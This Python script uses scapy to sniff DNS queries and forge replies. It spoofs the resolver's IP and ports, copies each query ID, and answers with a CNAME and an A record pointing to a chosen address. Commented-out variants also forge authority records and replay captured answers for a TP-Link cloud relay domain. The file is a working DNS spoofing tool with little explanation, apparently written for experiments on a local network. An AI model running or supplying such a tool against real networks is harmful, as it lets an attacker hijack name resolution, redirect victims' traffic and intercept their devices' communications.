#-*- coding: utf-8 -*-
__author__ = 'admin'

from scapy.all import *
import binascii

def dnsQueryMonitor(qnameStr = 'ANY'):
    '''
    嗅探DNS包请求，请求的地址为qnameStr
    :param qnameStr:'ANY'-监测所有域名请求 其他-指定域名，eg.'www.bing.com'
    :return:符合格式的DNS pkt
    '''
    if qnameStr == 'ANY':
        snifferResult = sniff(stop_filter=lambda x:(x.haslayer('DNS') and x['DNS'].qr == 0),
                              prn=lambda x:x.summary(),
                              )
        for x in snifferResult:
            if x.haslayer('DNS'):# and x['DNS'].qd.qname == qnameStr:
                return x
        else:
            return None
    else:
        snifferResult = sniff(stop_filter=lambda x:(x.haslayer('DNS') and x['DNS'].qr == 0 and x['DNS'].qd.qname == qnameStr),
                              prn=lambda x:x.summary(),
                              )
        for x in snifferResult:
            if x.haslayer('DNS') and x['DNS'].qd.qname == qnameStr :# and x['DNS'].qd.qname == qnameStr:
                return x
        else:
            return None

def domainToHex(domainStr = 'www.baidu.com'):
    dnameList = domainStr.split('.')
    hexStr = ''
    for part in dnameList:
        hexStr += ('00' + hex(len(part))[2:])[-2:]
        hexStr += binascii.hexlify(part)
    return hexStr+'00'

def compressDnsPkt(oriHexStr, tarHexStr):
    oriSplit = oriHexStr.split(tarHexStr)
    if len(oriSplit)==3:
        editHexStr = oriSplit[0] + tarHexStr + oriSplit[1]
        editHexStr+= 'c0' + ('00'+ hex(editHexStr.find(tarHexStr)/2)[2:])[-2:]
        editHexStr+=oriSplit[2]
        return editHexStr
    else:
        return oriHexStr

def dnsPktFaker(etherDst = None, etherSrc = None,
                   ipDst = None, ipSrc = None, dstPort = None, srcport = None,
                   dnsPkt= None):

    udpPkt = UDP(dport=srcport, sport=dstPort)
    ipPkt = IP(src = ipDst, dst=ipSrc)
    # etherPkt = Ether(dst=etherSrc, src=etherDst)
    etherPkt = Ether()
    fakePkt = etherPkt/ipPkt/udpPkt/dnsPkt
    return fakePkt

def dnsAnswerFaker(etherDst = None, etherSrc = None,
                   ipDst = None, ipSrc = None, dstPort = None, srcport = None,
                   idIn = None , qdIn = None,
                   nameStr = None, ansIP='192.168.1.100', type = 'STR'):
    """
    伪造DNS回复包
    :param etherDst:
    :param etherSrc:
    :param ipDst:
    :param ipSrc:
    :param dstPort:
    :param srcport:
    :param idIn:
    :param qdIn:
    :param nameStr:
    :param ansIP:
    :param type:
    :return:
    """
    ansObj = DNSRR(rrname = nameStr,
                        type='A',
                        rclass='IN',
                        ttl = 165,
                        rdata = ansIP)
    dnsPkt = DNS(id= idIn,  #来自查询包的pkt id
                 qr=1,      #0-query, 1-reply
                 opcode=0,  #0-standard query
                 rd=1,      #1-recursion query, 0-no redursion query
                 ra=1,      #1-recursion reply, 0-no recursion reply
                 rcode=0,       #no error
                 qdcount=1,     #query domain
                 ancount=1,     #answer count
                 qd=qdIn,       #query content
                 an=ansObj,
                 )
    udpPkt = UDP(dport=srcport, sport=dstPort)
    ipPkt = IP(src = ipDst, dst=ipSrc)
    # etherPkt = Ether(dst=etherSrc, src=etherDst)
    etherPkt = Ether()
    fakePkt = etherPkt/ipPkt/udpPkt/dnsPkt
    # return fakePkt
    return dnsPkt

"""
非递归回复，没有回答，报文压缩
查询域名relay-ipc.tplinkcloud.com.cn
0 answer
2 authority RRs, 指向ns17.xincache.com / ns18.xincache.com
8 additional RRs:
            ns17.xincache.com -> 120.52.19.143
                                58.216.26.233
                                113.17.175.216
            ns18.xincache.com -> 58.216.26.233
                                113.17.175.216
                                120.52.19.143
"""
noRecursionPkt=binascii.unhexlify('0000808000010000000200060972656c'
                                              '61792d6970630b74706c696e6b636c6f'
                                              '756403636f6d02636e0000010001c016'
                                              '000200010000bb400013046e73313708'
                                              '78696e636163686503636f6d00c01600'
                                              '0200010000bb400007046e733138c03f'
                                              'c03a00010001000001ce00047834138f'
                                              'c03a00010001000001ce00043ad81ae9'
                                              'c03a00010001000001ce00047111afd8'
                                              'c05900010001000001ce00043ad81ae9'
                                              'c05900010001000001ce00047111afd8'
                                              'c05900010001000001ce00047834138f')

recursionPkt = binascii.unhexlify('0000818000010009000600080972656c61792d6970630b74706c696e6b636c6f756403636f6d02636e0000010001c00c0005000100000000003b1f7072642d736f686f6970632d656c622d72656c61792d3438383538333738380a636e2d6e6f7274682d3103656c6209616d617a6f6e617773c022c03a0001000100000224000434500f1fc03a00010001000002240004345022a7c03a0001000100000224000436df6549c03a0001000100000224000436dec94bc03a0001000100000224000436deb6abc03a00010001000002240004345022bdc03a0001000100000224000436df9562c03a0001000100000224000436ded4f7c0260002000100001d090008016203646e73c026c0260002000100001d09000f026e73066365726e6574036e657400c0260002000100001d0900040161c103c0260002000100001d0900040165c103c0260002000100001d0900040164c103c0260002000100001d0900040163c103c150000100010002847d0004cb771c01c150001c000100001d09001020010dc7100000000000000000000001c1400001000100003ad30004cb771d01c16000010001000090410004cb771b01c101000100010000cad60004cb771a01c130000100010000c80a0004cb771901c130001c00010000c7d1001020010dc7000000000000000000000001c1150001000100001d090004ca70002c')



from socket import *
su = socket(AF_INET, SOCK_DGRAM)
su.bind(('0.0.0.0', 53))
if __name__ == '__main__':
    while True:
        pkt = dnsQueryMonitor()
        print('recv***********************')
        print(hexdump(pkt), pkt.summary(), binascii.hexlify(str(pkt)))

        fakeDnsPkt = dnsAnswerFaker(etherDst=pkt['Ether'].dst, etherSrc=pkt['Ether'].dst,
                                    ipDst=pkt['IP'].dst, ipSrc=pkt['IP'].src, dstPort=pkt['UDP'].dport, srcport=pkt['UDP'].sport,
                                    idIn=pkt['DNS'].id, qdIn=pkt['DNS'].qd,
                                    nameStr=pkt['DNS'].qd.qname)
        #使用scapy发送
        # sendp(fakeDnsPkt)

        #使用scocket发送
        # compressPktHexStr = compressDnsPkt(binascii.hexlify(str(fakeDnsPkt)), domainToHex(fakeDnsPkt.qd.qname))
        # su.sendto(binascii.unhexlify(compressPktHexStr), (pkt['IP'].src, pkt['UDP'].sport))
        # print('send***********************')
        # print(hexdump(fakeDnsPkt), fakeDnsPkt.summary(), binascii.hexlify(str(fakeDnsPkt)))

        # if pkt['DNS'].qd.qname=='relay-ipc.tplinkcloud.com.cn':
        #     sendPack = DNS(recursionPkt)
        #     sendPack.id = pkt['DNS'].id
        #     sendPack.rd = 1
        #     sendPack.ra = 0
        #     su.sendto(str(sendPack), (pkt['IP'].src, pkt['UDP'].sport))
        #     print('send*******************')
        #     sendPack = DNS(noRecursionPkt)
        #     print(hexdump(sendPack), sendPack.summary())
        #
        # if True:
        #     #非递归，无回答
        #     buildNoRecurPkt = DNS(qr=1,
        #                           id=pkt['DNS'].id,
        #                           qd=pkt['DNS'].qd,
        #                           rd=pkt['DNS'].rd,
        #                           ra=0,
        #                           nscount =1,
        #                           # tc=1,
        #                           # rcode=5,    #拒绝
        #                           ns=DNSRR(rrname=pkt['DNS'].qd.qname,
        #                                    type='NS',
        #                                    rclass='IN',
        #                                    ttl=34567,
        #                                    rdata='test.dns.yy'),
        #                           arcount = 1,
        #                           ar=DNSRR(rrname='test.dns.yy',
        #                                    type='A',
        #                                    rclass='IN',
        #                                    ttl=45678,
        #                                    rdata='192.168.1.99'))
        #     su.sendto(str(buildNoRecurPkt), (pkt['IP'].src, pkt['UDP'].sport))
        #     print('send*******************')
        #     print(hexdump(buildNoRecurPkt), buildNoRecurPkt.summary())

        # if True:
        #     #非递归，有回答
        #     buildNoRecurPkt = DNS(qr=1,
        #                           id=pkt['DNS'].id,
        #                           qd=pkt['DNS'].qd,
        #                           rd=pkt['DNS'].rd,
        #                           ra=0,
        #                           nscount=1,
        #                           tc=0,
        #                           rcode=0,    #拒绝
        #                           an=DNSRR(rrname=pkt['DNS'].qd.qname,
        #                                    type='NS',
        #                                    rclass='IN',
        #                                    ttl=34567,
        #                                    rdata='192.168.1.88'),
        #                           ns=DNSRR(rrname=pkt['DNS'].qd.qname,
        #                                    type='NS',
        #                                    rclass='IN',
        #                                    ttl=34567,
        #                                    rdata='test.dns.yy'),
        #                           arcount = 1,
        #                           ar=DNSRR(rrname='test.dns.yy',
        #                                    type='A',
        #                                    rclass='IN',
        #                                    ttl=45678,
        #                                    rdata='192.168.1.99'))
        #     su.sendto(str(buildNoRecurPkt), (pkt['IP'].src, pkt['UDP'].sport))
        #     print('send*******************')
        #     print(hexdump(buildNoRecurPkt), buildNoRecurPkt.summary())

        if True:
            #递归，有回答
            buildNoRecurPkt = DNS(qr=1,
                                  id=pkt['DNS'].id,
                                  qd=pkt['DNS'].qd,
                                  rd=pkt['DNS'].rd,
                                  tc=0,
                                  ra=1,
                                  rcode=0,
                                  ancount =2,
                                  an=(DNSRR(rrname=pkt['DNS'].qd.qname,
                                           type='CNAME',
                                           rclass='IN',
                                           ttl=45678,
                                           rdata='test.yy.yy')/
                                      DNSRR(rrname='test.yy.yy',
                                           type='A',
                                           rclass='IN',
                                           ttl=45678,
                                           rdata='192.168.1.99')
                                  ))
            fakeDnsPkt = dnsPktFaker(etherDst=pkt['Ether'].dst, etherSrc=pkt['Ether'].dst,
                                    ipDst=pkt['IP'].dst, ipSrc=pkt['IP'].src, dstPort=pkt['UDP'].dport, srcport=pkt['UDP'].sport,
                                    dnsPkt=buildNoRecurPkt)
            # su.sendto(str(buildNoRecurPkt),('192.168.1.222', pkt['UDP'].sport))
            sendp(Ether()/IP(src=pkt['IP'].dst, dst=pkt['IP'].src)/UDP(sport=pkt['UDP'].dport, dport=pkt['UDP'].sport)/buildNoRecurPkt)
            print('send*******************')
            print(hexdump(buildNoRecurPkt), buildNoRecurPkt.summary())

    # if True:
    #     d = domainToHex()
    #     print(d)
    #     print(binascii.unhexlify(d))
